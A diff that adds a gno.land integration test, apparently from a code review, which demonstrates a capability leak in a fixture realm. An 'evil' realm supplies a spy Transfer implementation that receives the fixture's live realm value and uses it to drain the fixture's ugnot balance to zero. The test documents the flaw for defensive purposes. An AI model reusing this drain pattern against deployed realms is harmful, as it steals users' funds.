@@ -1,0 +1,89 @@
+# Asserts that the new regression fixture realm r/tests/grc20_user_teller_leak
+# hands its own live `cur` to caller-supplied code. Any realm stores an
+# implementation and gets it invoked holding the fixture's realm capability, so
+# it mints a BankerTypeRealmSend banker for the fixture's address and empties it.
+# Measured at e014175d2: 500000ugnot parked on the fixture realm leaves as 0.
+#
+# Run: from a gno checkout:
+# gh pr checkout 6123 -R gnolang/gno && git checkout e014175d2
+# curl -fsSL -o gno.land/pkg/integration/testdata/grc20_leak_fixture_capability.txtar \
+#   https://raw.githubusercontent.com/samouraiworld/gno-agent-workspace/main/reviews/pr/6xxx/6123-grc20-eoa-writes/1-e014175d2/tests/grc20_leak_fixture_capability.txtar
+# go test -v -run 'TestTestdata/grc20_leak_fixture_capability' ./gno.land/pkg/integration/
+# rm gno.land/pkg/integration/testdata/grc20_leak_fixture_capability.txtar
+
+loadpkg gno.land/r/tests/grc20_user_teller_leak
+loadpkg gno.land/r/test/evil $WORK/evil
+
+adduser alice
+
+gnoland start
+
+gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
+stdout 'OK!'
+
+# Park coins on the fixture realm's address. Nothing here is privileged: any
+# account can send to a realm address.
+gnokey maketx call -pkgpath gno.land/r/test/evil -func Fund -send 1000000ugnot -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+gnokey query vm/qeval --data "gno.land/r/test/evil.LeakBalance()"
+stdout '500000 int64'
+
+# alice, an ordinary user, calls an ordinary realm. Store accepts any
+# implementation of the fixture's teller interface, and Transfer invokes it with
+# the fixture's live cur.
+gnokey maketx call -pkgpath gno.land/r/test/evil -func Attack -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+
+gnokey query vm/qeval --data "gno.land/r/test/evil.LeakBalance()"
+stdout '0 int64'        # IS:     caller-supplied code spends the fixture realm's balance
+# stdout '500000 int64' # SHOULD: the fixture never hands its realm value to an implementer it does not control
+
+-- evil/gnomod.toml --
+module = "gno.land/r/test/evil"
+gno = "0.9"
+
+-- evil/evil.gno --
+package evil
+
+import (
+	"chain"
+	"chain/banker"
+	"chain/runtime/unsafe"
+
+	"gno.land/r/tests/grc20_user_teller_leak"
+)
+
+const leakPath = "gno.land/r/tests/grc20_user_teller_leak"
+
+type spy struct{}
+
+// Transfer satisfies the fixture's teller interface. rlm arrives as the
+// fixture's own live cur, which NewBanker accepts as spend authority over
+// the fixture realm's address.
+func (s *spy) Transfer(_ int, rlm realm, to address, amount int64) error {
+	b := banker.NewBanker(banker.BankerTypeRealmSend, rlm)
+	bal := b.GetCoin(rlm.Address(), "ugnot")
+	b.SendCoins(rlm.Address(), to, chain.Coins{{"ugnot", bal}})
+	return nil
+}
+
+// Fund forwards half of the message's send envelope to the fixture realm.
+func Fund(cur realm) {
+	sent := unsafe.OriginSend()
+	half := sent.AmountOf("ugnot") / 2
+	b := banker.NewBanker(banker.BankerTypeRealmSend, cur)
+	b.SendCoins(cur.Address(), chain.PackageAddress(leakPath), chain.Coins{{"ugnot", half}})
+}
+
+// Attack stores the spy and triggers it. The amount and recipient the fixture
+// passes are ignored; the realm value it passes is the whole point.
+func Attack(cur realm) {
+	grc20_user_teller_leak.Store(cross(cur), &spy{})
+	if err := grc20_user_teller_leak.Transfer(cross(cur), cur.Address(), 1); err != nil {
+		panic(err)
+	}
+}
+
+func LeakBalance() int64 {
+	return banker.NewReadonlyBanker().GetCoin(chain.PackageAddress(leakPath), "ugnot")
+}
